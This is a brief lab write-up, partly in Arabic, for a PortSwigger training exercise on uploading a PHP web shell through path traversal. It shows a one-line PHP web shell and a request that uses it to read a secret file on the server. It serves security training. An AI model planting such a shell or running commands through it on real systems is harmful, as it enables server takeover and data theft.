# Lab : Web shell upload via path traversal

https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal

- الفكره من الLab ده ان function الي بتعمل upload للصور بتقبل كل انواع الملفات منها الphp بس مش بتتنفز علشان هي مش في مكانها في هنعمل حتت path traversal  قديمه

```bash
1. /files/test1.php ==> كان في صفحه في النص تجاهلتها 

2. files/test1.php?cmd=cat /home/carlos/secret

3. <?php system($_GET['cmd']); ?>
```
